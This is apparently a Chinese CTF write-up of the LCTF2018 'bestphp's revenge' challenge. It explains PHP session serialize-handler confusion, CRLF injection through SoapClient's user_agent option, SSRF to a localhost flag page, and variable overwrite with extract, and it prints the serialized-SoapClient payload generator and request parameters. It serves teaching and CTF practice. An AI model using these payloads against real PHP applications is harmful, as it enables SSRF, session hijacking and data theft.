---

title: SOAP安全问题和session反序列化

date: 2021-08-31 16:37:44

tags: 练习

categories: test92

---

最近做到一道新题，这道题包含了两个之前没见过的知识点，所以重点总结一下。  

# bestphp's revenge  

打开题目就能看到源码，很简洁：  

	<?php
	highlight_file(__FILE__);
	$b = 'implode';
	call_user_func($_GET['f'], $_POST);
	session_start();
	if (isset($_GET['name'])) {
	    $_SESSION['name'] = $_GET['name'];
	}
	var_dump($_SESSION);
	$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
	call_user_func($b, $a);
	?>   
	array(0) { }  

这道题还有一个flag.php页面，同样是一段源码：  

	only localhost can get flag!  
	session_start();   
	echo 'only localhost can get flag!';   
	$flag = 'LCTF{*************************}';   
	if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){   
	$_SESSION['flag'] = $flag; 
	} 
	only localhost can get flag!   

提示我们只能在本地拿到flag。看到这里其实可以知道这道题和ssrf有关，但是怎么转到本地的flag.php呢？这是一个难题。  

我们回过头再研究一下刚开始的源码，首先发现一个之前少见的函数call _user _func()。这是这道题的第一个关卡。

## call _user _func()

	call_user_func($a,$b)
	如果传入的参数，是一个数组，且数组的第一个值是一个类的名字，或一个对象，那么，就会把数组的第二个值，当做方法，然后执行。  

	如下所示：
	 <?php
	error_reporting(0);
	highlight_file(__FILE__);
	function fun($a){
	    echo $a;
	}
	call_user_func(fun, 12);
	
	?>      \\outcome：12，执行了fun()函数。

	但是如果类名中的方法不存在时，就会调用_call()方法,这个方法就和下面的新知识点有关。  

## SoapClient  

	这是一个php内置的类，当__call方法被触发后，它可以发送HTTP和HTTPS请求。该类的构造函数如下：

	public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）
	
	
	第一个参数是用来指明是否是wsdl模式。
	
	第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。

知晓了这两个参数，我们自然可以想到用它来构造ssrf请求，比如下面的：  

	<?php
	$a = new SoapClient(null, array('location' => "http://127.0.0.1/flag.php",
	                                 'uri'=> "123"));
	echo urlencode(serialize($a));
	?>  

这样我们就构造出了一个转向本地的payload。  

更加深入的是这个类还有一个选项为user_agent，运行我们自己设置User-Agent的值。  

当我们可以控制User-Agent的值时，也就意味着我们完全可以自己构造一个post请求。  

但是这个类到底该如何使用呢？这里就要联系上一个与它相关的漏洞。

## CRLF Injection漏洞   

这个漏洞其实之前就已经见过几次，但是总是一晃而过，并没有注意，这次趁这道题来再回顾一下。  

这个漏洞就是利用换行回车（\r\n）来污染HTTP头，因为在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。如下所示：  

	这是一个正常的跳转包
	HTTP/1.1 302 
	Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT 
	Content- Type: text/html
	Content-Length: 154 
	Connection: close
	Location:http://www.sina.com.cn  

	但是如果我们输入http://www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun，注入一个换行，那么它的返回包就会变成这样：  

	HTTP/1.1 302 
	Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT
	Content-Type: text/html 
	Content-Length: 154 
	Connection: close 
	Location: http://www.sina.com.cn Set-cookie: JSPSESSID=wooyun  

	这样我们就给访问这设置了一个session，造成一个“会话固定漏洞”。

当然这个漏洞并不限于这样使用，还有其他的使用方式，但是这道题目中我们可以看到代码中返回的是当前cookie的session值，

	var_dump($_SESSION);

而我们上面所提到的soap类中是没有指定的cookie接口的，所以，我们就可以在user_agent里面，加上一个\r\n，然后再加上一个cookie，就达到了我们的目的。也就是让我们post请求发送到指定的cookie上，那么我们通过访问我们指定的cookie就可以得到想要的flag。  

## cookie和session  

在代码中我们已经知道页面下方返回的数组是session的值，而我们传入的也是session值，我们上面又说cookie有和session有什么关系呢？这里简单讲一下。  

	如果说Cookie机制是通过检查客户身上的“通行证”来确定客户身份的话，那么Session机制就是通过检查服务器上的“客户明细表”来确认客户身份。
	 
	也就是说cookie通过在客户端记录信息确定用户身份，Session通过在服务器端记录信息确定用户身份。cookie是记录用户客户端身份，session是记录用户客户端状态  

而cookie和session也就是一一对应的，一个cookie值也就对应一个session的值，所以说这也就是为什么上面我们说构造post请求时要指定一个cookie，只有这样我们才能通过访问指定的cookie来得到session的值。  

## php序列化引擎对于session数据的处理  

这个也是新见到的一个知识点，序列化和反序列化已经见了很多了，但是关于不同的php序列化引擎对与session数据的处理还是第一次见到。  

PHP内置了多种处理器用于存储$_SESSION数据时会对数据进行序列化和反序列化，常见的有三种。  

当我们使用php_serialize引擎时进行数据存储时的序列化，可以得到内容  

	$_SESSION[‘name’] = ‘sky’;
	a:1:{s:4:”name”;s:3:”sky”;}  

可以看到这是我们常见的序列化方式，而在php引擎时进行数据存储时的序列化，可以得到另一个内容  
	
	$_SESSION[‘name’] = ‘sky’;
	name|s:3:”sky”  

可以看到，php引擎序列化的方法是键名+竖线+值，而它进行反序列化时也会按照这个规矩来反序列化，那么我们就可以找到关于session反序列化的一些漏洞。  

比如我们先使用php_serialize做序列化引擎，且数组的值里，就包含“|”符号。  

	$_SESSION[‘name’] = ‘|sky’;
	a:1:{s:4:”name”;s:4:”|sky”;}  

接着我们再使用php引擎进行反序列化，因为php引擎以竖线|作为分界，那么反序列化时**a:1:{s:4:”name”;s:4:”**就成为了键名，而sky成为了值被拿出来进行反序列化。  

那么如果我们再进行构造，就可以利用这两个引擎不同的规则得到我们想要的数据。比如注入下面数据。  

	a=|O:4:“test”:0:{}  
	
那么session中的内容是a:1:{s:1:“a”;s:16:"|O:4:“test”:0:{}";}，那么a:1:{s:1:“a”;s:16:"会被php解析成键名，后面就是一个test对象的注入。而我们上面所讲的soap类不也就可以像这样被构造出来从而被注入。  

## ini _set 和 session _start  

那么关于这些反序列化引擎我们如何更改呢？  

配置选项 session.serialize_handler，通过该选项可以设置序列化及反序列化时使用的处理器。  

而我们要想更改这个选项我们就可以使用ini _set这个函数，但是这个函数，不接受数组，所以就不行了。于是我们就用session _start来代替。  

接下来就是用这些知识点串起来来解题。  

首先我们要利用soap类先构造post请求。  

	<?php
	$target = "http://127.0.0.1/flag.php";
	$attack = new SoapClient(null,array('location' => $target,
    'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n",
    'uri' => "123"));
	$payload = urlencode(serialize($attack));
	echo $payload;  

这个请求很简单，就是指定了一个cookie值来访问本地的flag.php页面，利用SoapClient类来发送这个请求，发送的方法就是通过触发_call()方法.  

这里要注意序列化后我们要在payload前加上竖线"|"。这样就可以通过我们转换序列化引擎来达到注入数据的效果。  

### 第一步  

	1.利用call_user_func($_GET[‘f’], $_POST);函数，改变此页面的序列化引擎，为php_serialize。  

	这里就用到了call_user_func()函数，我们$f传入方法session_start，$post传入配置选项serialize_handler=php_serialize，从而更改这个页面的序列化引擎（这里post的配置选项是一个数组，这也就解释了为什么不能用ini_set方法）

	2.$_SESSION[‘name’] = $_GET[‘name’];将我们的序列化对象，传入session中，并在前面，加一个“|”符号。此时session会以php_serialize的规则储存：a:1:{s:4:“name”;s:199:"|O:10:"SoapClient…"}  

而下面也就将我们传入的session值进行反序列化后返回出来，结果和我们估计的一样。  

[![](https://pic.imgdb.cn/item/612dfdcd44eaada73985a993.png)](https://pic.imgdb.cn/item/612dfdcd44eaada73985a993.png)  

### 第二步  

接下来就是要触发_call()方法来让soap类发送我们构造好的请求，来访问本地的flag.php，达到ssrf效果。  

而触发_call()的要求我们之前也已讲到，要使call _user _func()这个函数访问一个对象内不存在的方法，这里我们再次回看一下题目代码。  

	<?php
	highlight_file(__FILE__);
	$b = 'implode';
	call_user_func($_GET['f'], $_POST);
	session_start();
	if (isset($_GET['name'])) {
	    $_SESSION['name'] = $_GET['name'];
	}
	var_dump($_SESSION);
	$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
	call_user_func($b, $a);
	?>  

可以看到，这个$b变量的值是固定的，这就导致我们最后一个call _user _func()没有发挥作用，那么我们就要从这里下手，我们首先利用第一个call _user _func()函数，将$b变量进行覆盖：  

	GET:?f=extract
	POST:b=call_user_func  

这里的extract是利用了变量覆盖漏洞，之前讲过，这里就带过了。  

这样传参后我们的$b也就变成了call _user _func，而最后的call _user _func($b,$a)实际上就变成了这样  

	call_user_func(call_user_func,$a)  

而$a的值是  
	
	$a=array(reset($_SESSION), 'welcome_to_the_lctf2018')  

也就是将session和'welcome_to_the_lctf2018'组合成一个数组，那么最终结果就是  

	call_user_func(call_user_func,array($_SESSION, 'welcome_to_the_lctf2018'))   

	这就变成了一个call _user _func()函数，对象是session，方法为'welcome_to_the_lctf2018'，很明显，session中是不会有'welcome_to_the_lctf2018'这个方法的，所以他就会触发_call()方法。  

而这次我们再次传入的session进行反序列化的引擎为php，并储存在session中那么它就会将竖线后的SoapClient单独反序列化，那么我们的_call()方法也就能成功触发SoapClient发送请求，那么服务器携带我们设置的cookie，去本地访问flag.php，然后把flag，储存在此cookie对应的session中。  

[![](https://pic.imgdb.cn/item/612e05b944eaada739944a26.png)](https://pic.imgdb.cn/item/612e05b944eaada739944a26.png)  

可以看到成功单独反序列化出soap类。

### 第三步  

我们接下来只需要访问我们所指定的cookie就能在返回的session值中找到flag。  

[![](https://pic.imgdb.cn/item/612e069d44eaada73995f4ab.png)](https://pic.imgdb.cn/item/612e069d44eaada73995f4ab.png)  

# 小结  

这道题代码很少却考到很多东西，每一个变量都有用途，将session的序列化和soap的安全问题联系在一起考了，这道题的难点就在如何构造请求，如何发送请求从而能够访问flag.php，而每一个知识点后面都还有更多的内容可以挖掘，这道题目的技巧也完全可以在其他题目中用到，是一道很不错的题目。  

[Cookie和Session详解](https://blog.csdn.net/gaoyong_stone/article/details/79524321?ops_request_misc=&request_id=&biz_id=102&utm_term=cookie&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-79524321.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187)  
[CRLF Injection漏洞的利用与实例分析](https://www.jianshu.com/p/d4c304dbd0af)